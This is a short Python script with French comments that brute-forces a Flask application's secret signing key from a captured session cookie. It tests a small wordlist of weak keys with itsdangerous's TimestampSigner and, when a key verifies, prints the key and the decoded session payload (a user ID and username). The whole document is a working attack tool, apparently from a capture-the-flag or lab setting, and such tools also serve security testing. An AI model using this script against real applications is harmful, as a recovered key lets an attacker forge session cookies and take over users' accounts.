from itsdangerous import TimestampSigner
import base64
import json

# Cookie récupéré du navigateur
cookie = "eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6InRlbHkifQ.aSq9Zg.6M5B8E4KFt-nK4_ELKx3xGN0nws"

print(f"Cookie à cracker: {cookie}")
print()

# Dictionnaire de clés candidates
wordlist = ['secret', 'password', 'sup3rs3cr3t', 'mysecretkey', 'flask', 'dev', 'development', 'production', 'admin', '123456', 'secretkey']

for candidate_key in wordlist:
    try:
        # Flask utilise TimestampSigner avec le salt 'cookie-session'
        signer = TimestampSigner(candidate_key, salt='cookie-session', key_derivation='hmac')

        # Essayer de vérifier la signature avec la clé candidate
        payload_b64 = signer.unsign(cookie)

        # Si on arrive ici sans exception, la clé est correcte!
        print(f"✓ SECRET_KEY trouvée : {candidate_key}")
        print(f"\nSignature valide!")

        # Décoder le payload pour afficher le contenu
        padding = 4 - len(payload_b64) % 4
        if padding != 4:
            payload_b64 += b'=' * padding
        payload_decoded = base64.urlsafe_b64decode(payload_b64)
        payload_json = json.loads(payload_decoded)

        print(f"\nContenu du cookie:")
        print(json.dumps(payload_json, indent=2))
        break

    except Exception:
        # La signature ne correspond pas, continuer avec la clé suivante
        print(f"✗ Test clé '{candidate_key}': échec")
        continue
else:
    print(f"\n✗ Aucune clé trouvée dans la wordlist")
